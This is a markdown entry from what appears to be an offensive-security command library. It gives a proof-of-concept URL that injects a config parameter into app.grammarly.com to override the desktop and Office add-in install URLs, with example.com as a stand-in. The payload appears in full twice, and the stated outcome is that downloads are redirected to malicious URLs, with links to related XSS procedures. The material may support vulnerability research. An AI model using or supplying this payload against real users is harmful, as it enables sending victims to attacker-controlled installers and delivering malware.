---
data: >-
  https://app.grammarly.com/?config={%22crossPlatformOfficeAddin%22:{%22infoURL%22:%22https://example.com%22},%22officeAddin%22:{%22installURL%22:%22https://example.com%22},%22desktop%22:{%22windows%22:{%22installURL%22:%22https://example.com%22},%22mac%22:{%22installURL%22:%22https://example.com%22}}}
tags:
  - config-override
  - poc
  - grammarly
type: command
executor: bash
platforms:
  - Web
id: b1519068-20c1-4d67-be83-890533669e3c
created_at: '2025-12-13T23:56:20.256Z'
updated_at: '2025-12-13T23:56:20.256Z'
verified: false
validated: true
submitted: true
---
# grammarly-config-override-download-urls

## Command

```bash
https://app.grammarly.com/?config={%22crossPlatformOfficeAddin%22:{%22infoURL%22:%22https://example.com%22},%22officeAddin%22:{%22installURL%22:%22https://example.com%22},%22desktop%22:{%22windows%22:{%22installURL%22:%22https://example.com%22},%22mac%22:{%22installURL%22:%22https://example.com%22}}}
```

## Description

PoC URL to override download URLs without XSS, altering various install URLs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `config` | JSON object overriding various install URLs to example.com | Yes |

## Examples

### Basic Usage

```bash
https://app.grammarly.com/?config={%22crossPlatformOfficeAddin%22:{%22infoURL%22:%22https://example.com%22},%22officeAddin%22:{%22installURL%22:%22https://example.com%22},%22desktop%22:{%22windows%22:{%22installURL%22:%22https://example.com%22},%22mac%22:{%22installURL%22:%22https://example.com%22}}}
```

## Expected Output

Redirects downloads to malicious URLs.

## Related

- [[procedures/Craft-PoC-URLs-for-Config-Injection]]
- [[procedures/Trigger-XSS-via-Affected-Features]]
